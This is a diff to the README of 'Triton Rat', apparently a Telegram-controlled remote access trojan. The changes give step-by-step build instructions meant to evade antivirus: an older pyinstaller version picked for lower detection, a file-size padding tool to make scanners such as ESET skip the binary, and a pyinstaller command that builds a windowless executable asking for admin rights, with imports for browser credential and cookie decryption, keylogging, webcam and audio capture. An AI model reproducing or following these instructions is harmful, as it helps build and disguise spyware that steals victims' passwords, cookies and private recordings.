@@ -49,9 +49,13 @@ That you need only hand (2 optional) , exe file that you will get from pyinstall
 
 
 # Download this project
+# In the old version of Rat we used a site for obfuscation and installed pyinstaller with github repo
+# But antiviruses now detect it worse than installin pyinstaller via pip
+# and Virustotal will show less detection than obfuscation
+# But I wouldn't be me if i didn't find an obfuscation method
+# There are still decetions , but at least we make fewer of them.
 
-$ Download pyinstaller from https://github.com/pyinstaller/pyinstaller
-# because most antiviruses will detect as virus pyinstaller from original pip version
+$ Download pyinstaller 5.13.0 or older versions: pip install pyinstaller==5.13.0
 # if you downloaded pyinstaller from pip like pip install pyinstaller
 # Delete that 
 
@@ -66,12 +70,14 @@ $ pip install -r requirements.txt
 $ bot = telebot.TeleBot('your api token')
 
 # !MAIN STEP! obfuscation will help to deceive antiviruses
-$ to obfuscate that script copy full code and paste it in https://freecodingtools.org/py-obfuscator
-$ https://freecodingtools.org/py-obfuscator
-# Of course you can use another obfuscators but i like that obfuscator (this is not an advertisement)
+$ For obfuscation we will use my python program which you can find at the link: https://github.com/WhiteeRabbit/fake_file_resizer
+$ https://github.com/WhiteeRabbit/fake_file_resizer
+# We can increase the file size through this appalication so that antiviruses skip rat beacuse of size.
+# For example if you write the size 620 mb , Antivirus Eset will skip that,and it will less detetct.
+# Today this is the best obfuscation method of obfuscation 
 
 # after downloading pyinstaller run:
-$ pyinstaller --onefile --noconsole --uac-admin --hidden-import telebot --hidden-import pyautogui --hidden-import cv2 --hidden-import json --hidden-import base64 --hidden-import sqlite3 --hidden-import win32crypt --hidden-import Cryptodome.Cipher.AES --hidden-import shutil --hidden-import datetime --hidden-import numpy --hidden-import pyaudio --hidden-import wave --hidden-import random --hidden-import browser_cookie3 --hidden-import pyttsx3 Triton_Rat_Release.py
+$ pyinstaller --onefile --noconsole --uac-admin --hidden-import telebot --hidden-import pyautogui --hidden-import cv2 --hidden-import json --hidden-import base64 --hidden-import sqlite3 --hidden-import win32crypt --hidden-import Cryptodome.Cipher.AES --hidden-import shutil --hidden-import datetime --hidden-import numpy --hidden-import pyaudio --hidden-import wave --hidden-import random --hidden-import browser_cookie3 --hidden-import pyttsx3 --hidden-import pynput Triton_Rat_Release.py
 
 
 
